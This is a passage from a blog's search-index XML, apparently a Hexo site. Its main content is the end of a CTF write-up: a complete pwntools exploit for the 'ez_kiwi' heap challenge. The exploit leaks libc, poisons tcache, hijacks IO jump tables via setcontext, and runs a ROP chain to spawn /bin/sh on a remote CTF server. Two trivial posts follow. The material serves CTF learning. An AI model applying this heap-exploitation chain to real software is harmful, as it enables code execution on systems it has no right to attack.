class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ez_kiwi&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ez_kiwi&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27690</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;give me your name:\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How much do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to put?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Tell me your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to look?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to change?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Change your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br><br>leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br><span class="hljs-comment">#add(0x80, 9, b&#x27;a&#x27;)</span><br><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p> 参考：<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/11/01/Hello-world/"/>
    <url>/2022/11/01/Hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello World</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">avatar:</span> <span class="hljs-string">&quot;https://xtxtn.github.io/img/my.jpg&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/31/2022-10-31/"/>
    <url>/2022/10/31/2022-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="2022-10-31"><a href="#2022-10-31" class="headerlink" title="2022-10-31"></a>2022-10-31</h2><p><strong>Happy halloween</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
